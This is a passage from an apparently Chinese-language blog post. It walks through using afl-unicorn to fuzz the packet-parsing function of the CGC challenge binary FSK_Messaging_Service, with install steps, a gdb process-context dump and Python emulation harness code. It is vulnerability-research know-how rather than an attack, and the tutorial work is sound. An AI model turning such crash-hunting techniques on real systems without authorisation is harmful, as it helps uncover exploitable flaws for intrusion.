DATA_SIZE_MAX)</span><br><span class="line">    uc.mem_write(DATA_ADDRESS, input)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#------------------------------------------------------------</span></span><br><span class="line">    <span class="comment"># Emulate the code, allowing it to process the mutated input</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Executing until a crash or execution reaches 0x&#123;0:016x&#125;"</span>.format(end_address))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = uc.emu_start(uc.reg_read(UC_MIPS_REG_PC), end_address, timeout=<span class="number">0</span>, count=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"Execution failed with error: &#123;&#125;"</span>.format(e))</span><br><span class="line">        force_crash(e)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Done."</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>看一下第二篇<br><a href="https://hackernoon.com/afl-unicorn-part-2-fuzzing-the-unfuzzable-bea8de3540a5" target="_blank" rel="noopener">https://hackernoon.com/afl-unicorn-part-2-fuzzing-the-unfuzzable-bea8de3540a5</a></p><h3 id="task1-FSK-Messaging-Service"><a href="#task1-FSK-Messaging-Service" class="headerlink" title="task1 FSK_Messaging_Service"></a>task1 FSK_Messaging_Service</h3><p>第二篇以一个相对具体的例子，将afl-unicorn的使用场景从不到30行的case扩展到了一个CGC CTF题<br>FSK_Messaging_Service<br>题目描述是这样的：这是一项服务，该服务实现了具有分组FSK解调前端，分组解码，处理以及最终将其解析为简单Messenger服务的分组无线接收器。</p><h4 id="step0"><a href="#step0" class="headerlink" title="step0"></a>step0</h4><p>安装afl-unicorn</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;path&#x2F;to&#x2F;afl-unicorn</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">cd unicorn_mode</span><br><span class="line">sudo .&#x2F;build_unicorn_support.sh</span><br></pre></td></tr></table></figure><p>另外这里还有个坑，如果你在18.04系统上不能运行起来它，可以试试16.04，这卡了我几个小时。</p><h4 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h4><p>首要的工作是对要fuzz的代码进行理解，也就是说理清楚要fuzz的起点和终点，需要构造的输入是什么？输入是如何传递进去的，输入上有哪些约束，比如最大最短长度，是否需要满足某个具体的算式，这个约束是不变的还是动态的。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-05-064150.jpg" alt=""></p><p>虽然我其实不太看得懂这些东西，但是粗略的理解来说就是如果直接构造输入喂进去，那么会卡在Demodulation Logic部分，永远无法正确的突破。<br>可以粗略的理解成，如果你用AFL去fuzz js引擎，那它几乎不太可能去生成有效的js语法，会卡在语法parser那里，举个例子,for进行一轮字节变异成aor，能通过才见鬼了。</p><p>而通过AFL-unicorn我们可以直接过掉前面这部分代码，直接将Message Packet Parsing Logic作为Harness，把Packets作为原始输入去fuzz。</p><p>但其实看到这里，Packet的构造还是存在一定问题的，首先即使这个Packet喂进去了造成Crash，如何从更上层输入去构造出这个Packet，会不会有更上层的过滤导致永远不可能构造出来这个Packet，这都是很容易考虑到的问题，不过这里暂时略过这个问题往下看吧。</p><p>从Packets做输入，那么关键代码就在packet.c里，<br><a href="https://github.com/trailofbits/cb-multios/blob/master/challenges/FSK_Messaging_Service/src/packet.c" target="_blank" rel="noopener">https://github.com/trailofbits/cb-multios/blob/master/challenges/FSK_Messaging_Service/src/packet.c</a><br>选择要fuzz的函数是cgc_receive_packet<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-05-095657.png" alt=""><br>函数的基本功能如下：</p><ol><li>校验packet buffer不为空且长度大于0</li><li>计算16位CRC校验和以验证数据包的内容</li><li>循环检查packet type，如果匹配，则调用cgc_add_new_packet实例化tSinglePacketData对象pNewPacket，并向其中memcpy来自原始数据包的信息。</li></ol><p>现在我们开始考虑参数和约束<br>void cgc_receive_packet( uint8_t *pData, uint8_t dataLen, uint16_t packetCRC )<br>pData是指向数据包的指针，dataLen是其长度，packetCRC是16位CRC校验和。<br>显而易见的约束是CRC要正确。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Perform Checksum check</span></span><br><span class="line"><span class="keyword">uint16_t</span> check_checksum = cgc_simple_checksum16( pData, dataLen );</span><br><span class="line"><span class="comment">// Validate Checksum</span></span><br><span class="line"><span class="keyword">if</span> ( packetCRC != check_checksum )</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><h4 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h4><p>其实看到这里就感觉没必要继续看下去了，价值很有限了。<br>简单地说接下来的工作是要dump出有效的进程上下文，这个原因十分简单，在之前我们学习Unicorn的时候就遇到了很多问题，有很多运行时才会分配的内存区域，比如堆分配、栈指针、全局变量这些东西。<br>但是说到底……<strong>我要是能把固件跑起来，我还要你这个仿真干嘛</strong><br>问题就在这里了，所以我感觉除了极小量级的代码可能还能用一下，越是复杂，接口不规范的东西，越是不可能用这个东西跑起来了。<br>但权做学习吧。</p><p>afl-unicorn的helper tools<br><a href="https://github.com/Battelle/afl-unicorn/blob/master/unicorn_mode/helper_scripts/unicorn_dumper_ida.py" target="_blank" rel="noopener">https://github.com/Battelle/afl-unicorn/blob/master/unicorn_mode/helper_scripts/unicorn_dumper_ida.py</a></p><p>IDA的版本要求&lt;7，我试一下gdb版的能不能用。<br><a href="https://github.com/Battelle/afl-unicorn/blob/master/unicorn_mode/helper_scripts/unicorn_dumper_gdb.py" target="_blank" rel="noopener">https://github.com/Battelle/afl-unicorn/blob/master/unicorn_mode/helper_scripts/unicorn_dumper_gdb.py</a></p><p>选择在此处断下，此时eax中存放pData，edx（dl)里存放dataLen<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-05-100802.png" alt=""><br>在此处dump进程上下文。</p><p>我在这卡住了，因为我想了想我好像并不知道该怎么hit到cgc_receive_packet的代码，在进行了”繁琐”的逆向工程之后。<br>我找到了作者的issue。<br><a href="https://github.com/Battelle/afl-unicorn/issues/9" target="_blank" rel="noopener">https://github.com/Battelle/afl-unicorn/issues/9</a><br>它给了一个patch用来生成有效输入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;pov &gt; case</span><br><span class="line"></span><br><span class="line">sakura@ubuntu:~&#x2F;unicorn&#x2F;cb-multios&#x2F;build&#x2F;challenges&#x2F;FSK_Messaging_Service$ .&#x2F;FSK_Messaging_Service &lt; case</span><br><span class="line">[[RECEIVER STARTED -- TIMESTAMP: 1453110580]]</span><br><span class="line">Total 12 bytes received and 0 invalid packets.</span><br><span class="line">Displaying 2 received packets:</span><br><span class="line">Displaying packet 0 type 3:</span><br><span class="line">[CONNECT MESSAGE]ASDF connected</span><br><span class="line">Displaying packet 1 type 3:</span><br><span class="line">[CONNECT MESSAGE]ASDF connected</span><br></pre></td></tr></table></figure><p>差不多效果这样。<br>然后开始dump上下文了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~&#x2F;unicorn$ gdb .&#x2F;FSK_Messaging_Service</span><br><span class="line">Reading symbols from .&#x2F;FSK_Messaging_Service...done.</span><br><span class="line">gef➤  b *0x804D106</span><br><span class="line">Breakpoint 1 at 0x804d106: file &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;cb-multios&#x2F;challenges&#x2F;FSK_Messaging_Service&#x2F;src&#x2F;baseband.c, line 330.</span><br><span class="line">gef➤  x&#x2F;5i 0x804D106</span><br><span class="line">   0x804d106 &lt;cgc_do_sample+854&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">   0x804d109 &lt;cgc_do_sample+857&gt;:movzx  eax,dl</span><br><span class="line">   0x804d10c &lt;cgc_do_sample+860&gt;:mov    DWORD PTR [esp+0x4],eax</span><br><span class="line">   0x804d110 &lt;cgc_do_sample+864&gt;:movzx  eax,WORD PTR [ecx+0x126]</span><br><span class="line">   0x804d117 &lt;cgc_do_sample+871&gt;:mov    DWORD PTR [esp+0x8],eax</span><br><span class="line">gef➤  r &lt; case</span><br><span class="line">Starting program: &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;FSK_Messaging_Service &lt; case</span><br><span class="line">[[RECEIVER STARTED -- TIMESTAMP: 1453110580]]</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$eax   : 0xffffd3c6  →  0x53410403</span><br><span class="line">$ebx   : 0x0</span><br><span class="line">$ecx   : 0xffffd3a0  →  0xf7fd0002  →  0x306cf7fd</span><br><span class="line">$edx   : 0xffffd306  →  0x00000000</span><br><span class="line">$esp   : 0xffffd1e0  →  0xcccccccd</span><br><span class="line">$ebp   : 0xffffd208  →  0xffffd238  →  0xffffd258  →  0xffffd4d8  →  0x00000000</span><br><span class="line">$esi   : 0xc0d2</span><br><span class="line">$edi   : 0x0</span><br><span class="line">$eip   : 0x0804d106  →  &lt;cgc_do_sample+854&gt; mov DWORD PTR [esp], eax</span><br><span class="line">$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063</span><br><span class="line">───────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffffd1e0│+0x0000: 0xcccccccd ← $esp</span><br><span class="line">0xffffd1e4│+0x0004: 0x40308ccc</span><br><span class="line">0xffffd1e8│+0x0008: 0x00000000</span><br><span class="line">0xffffd1ec│+0x000c: 0x40310000</span><br><span class="line">0xffffd1f0│+0x0010: 0x00000000</span><br><span class="line">0xffffd1f4│+0x0014: 0x40080000</span><br><span class="line">0xffffd1f8│+0x0018: 0x04000000</span><br><span class="line">0xffffd1fc│+0x001c: 0x00000000</span><br><span class="line">─────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">    0x804d0fd &lt;cgc_do_sample+845&gt; mov    ecx, DWORD PTR [ebp+0x8]</span><br><span class="line">    0x804d100 &lt;cgc_do_sample+848&gt; mov    dl, BYTE PTR [ecx+0x23]</span><br><span class="line">    0x804d103 &lt;cgc_do_sample+851&gt; mov    ecx, DWORD PTR [ebp+0x8]</span><br><span class="line"> →  0x804d106 &lt;cgc_do_sample+854&gt; mov    DWORD PTR [esp], eax</span><br><span class="line">    0x804d109 &lt;cgc_do_sample+857&gt; movzx  eax, dl</span><br><span class="line">    0x804d10c &lt;cgc_do_sample+860&gt; mov    DWORD PTR [esp+0x4], eax</span><br><span class="line">    0x804d110 &lt;cgc_do_sample+864&gt; movzx  eax, WORD PTR [ecx+0x126]</span><br><span class="line">    0x804d117 &lt;cgc_do_sample+871&gt; mov    DWORD PTR [esp+0x8], eax</span><br><span class="line">    0x804d11b &lt;cgc_do_sample+875&gt; call   0x804d9f0 &lt;cgc_receive_packet&gt;</span><br><span class="line">───────────────────────────────────── source:&#x2F;home&#x2F;sakura&#x2F;un[...].c+330 ────</span><br><span class="line">    325 #if DEBUG_BASEBAND</span><br><span class="line">    326 cgc_printf( &quot;Packet RX[$d][$X]\n&quot;, pState-&gt;packetState.packetDataLen, pState-&gt;packetState.packetCRC );</span><br><span class="line">    327 #endif</span><br><span class="line">    328</span><br><span class="line">    329 &#x2F;&#x2F; Packet received! -- send to packet processing</span><br><span class="line">            &#x2F;&#x2F; pState&#x3D;0xffffd210  →  [...]  →  0x306cf7fd</span><br><span class="line"> →  330 cgc_receive_packet( pState-&gt;packetState.packetData, pState-&gt;packetState.packetDataLen, pState-&gt;packetState.packetCRC );</span><br><span class="line">    331</span><br><span class="line">    332 &#x2F;&#x2F; Reset</span><br><span class="line">    333 cgc_reset_baseband_state( pState );</span><br><span class="line">    334 &#125;</span><br><span class="line">    335 &#125;</span><br><span class="line">─────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: &quot;FSK_Messaging_S&quot;, stopped 0x804d106 in cgc_do_sample (), reason: BREAKPOINT</span><br><span class="line">───────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x804d106 → cgc_do_sample(pState&#x3D;0xffffd3a0, sample_in&#x3D;0x0)</span><br><span class="line">[#1] 0x804ccbb → cgc_run_cdr(pState&#x3D;0xffffd3a0, in_sample&#x3D;0x0)</span><br><span class="line">[#2] 0x804ca25 → cgc_process_sample(pState&#x3D;0xffffd3a0, in_sample&#x3D;0x0)</span><br><span class="line">[#3] 0x804e6cd → main(secret_page_i&#x3D;0x4347c000, unused&#x3D;0xffffd574)</span><br><span class="line">────────────────────────────────────────────────────────────────────────────</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0804d106 in cgc_do_sample (pState&#x3D;0xffffd3a0, sample_in&#x3D;0x0) at &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;cb-multios&#x2F;challenges&#x2F;FSK_Messaging_Service&#x2F;src&#x2F;baseband.c:330</span><br><span class="line">330cgc_receive_packet( pState-&gt;packetState.packetData, pState-&gt;packetState.packetDataLen, pState-&gt;packetState.packetCRC );</span><br><span class="line">gef➤</span><br><span class="line">gef➤  source unicorn_dumper_gdb.py</span><br><span class="line">----- Unicorn Context Dumper -----</span><br><span class="line">You must be actively debugging before running this!</span><br><span class="line">If it fails, double check that you are actively debugging before running.</span><br><span class="line">Process context will be output to UnicornContext_20200405_045024</span><br><span class="line">Dumping segment @0x0000000008048000 (size:0x7000): &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;FSK_Messaging_Service [&#123;&#39;r&#39;: True, &#39;w&#39;: False, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x000000000804f000 (size:0x1000): &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;FSK_Messaging_Service [&#123;&#39;r&#39;: True, &#39;w&#39;: True, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x0000000008050000 (size:0x22000): [heap] [&#123;&#39;r&#39;: True, &#39;w&#39;: True, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x000000004347c000 (size:0x1000):  [&#123;&#39;r&#39;: True, &#39;w&#39;: True, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7dbd000 (size:0x1d5000): &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so [&#123;&#39;r&#39;: True, &#39;w&#39;: False, &#39;x&#39;: True&#125;]</span><br><span class="line">Skipping segment &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so@0x00000000f7f92000</span><br><span class="line">Dumping segment @0x00000000f7f93000 (size:0x2000): &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so [&#123;&#39;r&#39;: True, &#39;w&#39;: False, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7f95000 (size:0x1000): &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so [&#123;&#39;r&#39;: True, &#39;w&#39;: True, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7f96000 (size:0x3000):  [&#123;&#39;r&#39;: True, &#39;w&#39;: True, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7fc5000 (size:0x1000):  [&#123;&#39;r&#39;: True, &#39;w&#39;: True, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7fc6000 (size:0x3000): &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;cb-multios&#x2F;build&#x2F;include&#x2F;tiny-AES128-C&#x2F;libtiny-AES128-C.so [&#123;&#39;r&#39;: True, &#39;w&#39;: False, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7fc9000 (size:0x1000): &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;cb-multios&#x2F;build&#x2F;include&#x2F;tiny-AES128-C&#x2F;libtiny-AES128-C.so [&#123;&#39;r&#39;: True, &#39;w&#39;: False, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7fca000 (size:0x1000): &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;cb-multios&#x2F;build&#x2F;include&#x2F;tiny-AES128-C&#x2F;libtiny-AES128-C.so [&#123;&#39;r&#39;: True, &#39;w&#39;: True, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7fcb000 (size:0x3000): &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;cb-multios&#x2F;build&#x2F;include&#x2F;libcgc.so [&#123;&#39;r&#39;: True, &#39;w&#39;: False, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7fce000 (size:0x1000): &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;cb-multios&#x2F;build&#x2F;include&#x2F;libcgc.so [&#123;&#39;r&#39;: True, &#39;w&#39;: False, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7fcf000 (size:0x1000): &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;cb-multios&#x2F;build&#x2F;include&#x2F;libcgc.so [&#123;&#39;r&#39;: True, &#39;w&#39;: True, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7fd0000 (size:0x2000):  [&#123;&#39;r&#39;: True, &#39;w&#39;: True, &#39;x&#39;: True&#125;]</span><br><span class="line">Exception reading segment ([vvar]): &lt;class &#39;gdb.MemoryError&#39;&gt;</span><br><span class="line">Dumping segment @0x00000000f7fd5000 (size:0x1000): [vdso] [&#123;&#39;r&#39;: True, &#39;w&#39;: False, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7fd6000 (size:0x26000): &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so [&#123;&#39;r&#39;: True, &#39;w&#39;: False, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7ffc000 (size:0x1000): &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so [&#123;&#39;r&#39;: True, &#39;w&#39;: False, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7ffd000 (size:0x1000): &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so [&#123;&#39;r&#39;: True, &#39;w&#39;: True, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000fffdd000 (size:0x21000): [stack] [&#123;&#39;r&#39;: True, &#39;w&#39;: True, &#39;x&#39;: True&#125;]</span><br><span class="line">Done.</span><br></pre></td></tr></table></figure><p>大概这样。<br>粗略看了一下dump程序，基本上就是调用了gef的get_process_maps接口，然后依次把每个segment的内存保存下来和调用get_register接口保存寄存器信息。</p><h4 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h4><p>接下来就开始编写harness了。<br>其实用c来写比python效率要快很多，但是为了快速学习，这里就用python搞一下。<br>整体的Harness的流程就是：</p><ol><li>创建和分配memory map</li><li>加载target程序到memory map</li><li>仿真执行至少一条指令(hack trick)</li><li>从afl获取data和size用以fuzz</li><li>设置初始状态，即进程上下文</li><li>仿真代码，并正确处理crash</li></ol><p>基本上每个harness都是这样，对着往里面填模板就好了。<br>这里的<a href="https://github.com/Battelle/afl-unicorn/blob/master/unicorn_mode/helper_scripts/unicorn_loader.py" target="_blank" rel="noopener">unicorn_loader</a>在这。<br>用处就是把我们之前dump出来的context加载进去。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *  <span class="comment"># <span class="doctag">TODO:</span> Set correct architecture here as necessary</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> unicorn_loader </span><br><span class="line"></span><br><span class="line"><span class="comment"># Simple stand-in heap to prevent OS/kernel issues</span></span><br><span class="line">unicorn_heap = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Start and end address of emulation</span></span><br><span class="line">START_ADDRESS = <span class="comment"># <span class="doctag">TODO:</span> Set start address here</span></span><br><span class="line">END_ADDRESS   = <span class="comment"># <span class="doctag">TODO:</span> Set end address here</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Implement target-specific hooks in here.</span></span><br><span class="line"><span class="string">    Stub out, skip past, and re-implement necessary functionality as appropriate</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unicorn_hook_instruction</span><span class="params">(uc, address, size, user_data)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># <span class="doctag">TODO:</span> Setup hooks and handle anything you need to here</span></span><br><span class="line">    <span class="comment">#    - For example, hook malloc/free/etc. and handle it internally</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------</span></span><br><span class="line"><span class="comment">#---- Main test function  </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">'context_dir'</span>, type=str, help=<span class="string">"Directory containing process context"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'input_file'</span>, type=str, help=<span class="string">"Path to the file containing the mutated input content"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-d'</span>, <span class="string">'--debug'</span>, default=<span class="literal">False</span>, action=<span class="string">"store_true"</span>, help=<span class="string">"Dump trace info"</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Loading context from &#123;&#125;"</span>.format(args.context_dir))</span><br><span class="line">    uc = unicorn_loader.AflUnicornEngine(args.context_dir, enable_trace=args.debug, debug_print=<span class="literal">False</span>)       </span><br><span class="line"></span><br><span class="line">    <span class="comment"># Instantiate the hook function to avoid emulation errors</span></span><br><span class="line">    <span class="keyword">global</span> unicorn_heap</span><br><span class="line">    unicorn_heap = unicorn_loader.UnicornSimpleHeap(uc, debug_print=<span class="literal">True</span>)</span><br><span class="line">    uc.hook_add(UC_HOOK_CODE, unicorn_hook_instruction)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Execute 1 instruction just to startup the forkserver</span></span><br><span class="line">    <span class="comment"># <span class="doctag">NOTE:</span> This instruction will be executed again later, so be sure that</span></span><br><span class="line">    <span class="comment">#       there are no negative consequences to the overall execution state.</span></span><br><span class="line">    <span class="comment">#       If there are, change the later call to emu_start to no re-execute </span></span><br><span class="line">    <span class="comment">#       the first instruction.</span></span><br><span class="line">    print(<span class="string">"Starting the forkserver by executing 1 instruction"</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        uc.emu_start(START_ADDRESS, <span class="number">0</span>, <span class="number">0</span>, count=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"ERROR: Failed to execute a single instruction (error: &#123;&#125;)!"</span>.format(e))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Allocate a buffer and load a mutated input and put it into the right spot</span></span><br><span class="line">    <span class="keyword">if</span> args.input_file:</span><br><span class="line">        print(<span class="string">"Loading input content from &#123;&#125;"</span>.format(args.input_file))</span><br><span class="line">        input_file = open(args.input_file, <span class="string">'rb'</span>)</span><br><span class="line">        input_content = input_file.read()</span><br><span class="line">        input_file.close()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> Apply constraints to mutated input here</span></span><br><span class="line">        <span class="keyword">raise</span> exceptions.NotImplementedError(<span class="string">'No constraints on the mutated inputs have been set!'</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Allocate a new buffer and put the input into it</span></span><br><span class="line">        buf_addr = unicorn_heap.malloc(len(input_content))</span><br><span class="line">        uc.mem_write(buf_addr, input_content)</span><br><span class="line">        print(<span class="string">"Allocated mutated input buffer @ 0x&#123;0:016x&#125;"</span>.format(buf_addr))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> Set the input into the state so it will be handled</span></span><br><span class="line">        <span class="keyword">raise</span> exceptions.NotImplementedError(<span class="string">'The mutated input was not loaded into the Unicorn state!'</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># Run the test</span></span><br><span class="line">    print(<span class="string">"Executing from 0x&#123;0:016x&#125; to 0x&#123;1:016x&#125;"</span>.format(START_ADDRESS, END_ADDRESS))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span 